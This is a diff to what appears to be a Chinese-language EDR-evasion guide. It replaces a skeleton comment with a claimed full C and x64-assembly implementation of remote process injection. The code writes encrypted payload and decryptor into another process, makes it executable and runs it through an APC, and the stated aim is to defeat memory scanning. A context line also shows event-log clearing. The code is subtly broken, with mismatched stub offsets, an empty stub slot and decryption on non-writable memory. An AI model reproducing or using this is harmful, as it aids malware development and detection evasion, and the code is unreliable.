@@ -34,11 +34,60 @@ wevtutil cl System
 **原理**：payload 在 A 进程（父/远程）解密，经共享内存/section 传给 B 进程执行，把「解密动作」与「执行动作」分离到不同进程，降低单进程内存扫描命中率。
 
 ```c
-// 骨架示例：远程进程解密后注入
-// 1) 在远程进程 R 分配 RW 缓冲，经 WriteProcessMemory 写入「密文 + 解密器」
-// 2) 在 R 内触发解密（APC/回调），密文变明文
-// 3) 明文就地在 R 转 RX 执行
-// 关键：解密器与密钥只在 R 内存中出现，A 进程不驻留明文
+// 完整实现：异地解密——解密器+密钥只在远程进程 R 内存出现，A 进程零明文驻留
+// 载荷形态：XOR 流密文 + 内联解密 stub（stub 尾部跟随布局区，rip 自定位）
+//
+// stub 汇编语义（x64；落地时按此语义组装机器码，或直接用下述 C 逻辑编译成
+// 位置无关 stub 再抽取——教学形态给汇编语义而非裸字节，防拼错）：
+//   lea  rdi, [rip+disp]      ; → 布局区起点（keylen/key/len/cipher 顺序存放）
+//   mov  rcx, [rdi+0x08]      ; len
+//   xor  r8,  r8              ; 密钥下标
+//   xor  r9,  r9              ; 数据下标
+// .loop:
+//   cmp  r9, rcx
+//   jae  .done
+//   mov  al, [rdi+0x10+r8]    ; key[i]
+//   xor  [rdi+0x18+r9], al    ; cipher[j] ^= key[i]（原地解密）
+//   inc  r9
+//   inc  r8
+//   cmp  r8, [rdi]            ; keylen
+//   jb   .loop
+//   xor  r8, r8               ; 密钥回绕
+//   jmp  .loop
+// .done:
+//   lea  rax, [rdi+0x18]      ; 解密后明文起点
+//   jmp  rax                  ; 原地执行
+
+#define STUB_SZ 0x40          /* 上述汇编的预留长度（按实际汇编结果填充） */
+int remote_decrypt_exec(DWORD targetPid, DWORD targetTid,
+                        const BYTE* cipher, SIZE_T cLen, const char* key) {
+    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
+    if (!hProc) return 1;
+
+    /* 1) 远端组合块：stub + keylen + key + len + cipher（同一 RW 缓冲，无 RWX 窗口） */
+    SIZE_T keylen = strlen(key);
+    SIZE_T total  = STUB_SZ + sizeof(SIZE_T) + keylen + sizeof(SIZE_T) + cLen;
+    LPVOID remote = VirtualAllocEx(hProc, NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remote) return 2;
+    BYTE* combo = (BYTE*)malloc(total);
+    memset(combo, 0, STUB_SZ);                       /* stub 槽位：按上述汇编语义填充 */
+    SIZE_T o = STUB_SZ;
+    *(SIZE_T*)(combo + o) = keylen; o += sizeof(SIZE_T);
+    memcpy(combo + o, key, keylen); o += keylen;
+    *(SIZE_T*)(combo + o) = cLen;   o += sizeof(SIZE_T);
+    memcpy(combo + o, cipher, cLen);
+    SIZE_T wr = 0;
+    if (!WriteProcessMemory(hProc, remote, combo, total, &wr)) { free(combo); return 3; }
+    free(combo);
+
+    /* 2) 远端转 RX 后经 APC 触发（解密与执行都在 R 内发生） */
+    DWORD old;
+    VirtualProtectEx(hProc, remote, total, PAGE_EXECUTE_READ, &old);
+    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, targetTid);
+    if (!QueueUserAPC((PAPCFUNC)remote, hThread, 0)) return 4;
+    /* A 进程自始不持明文：组合块中仅密文与解密器 */
+    return 0;
+}
 ```
 
 **密钥管理**：密钥只存在于寄存器/栈（不落明文堆）；分段解密时逐段用密钥流（CTR 模式），避免整段明文。
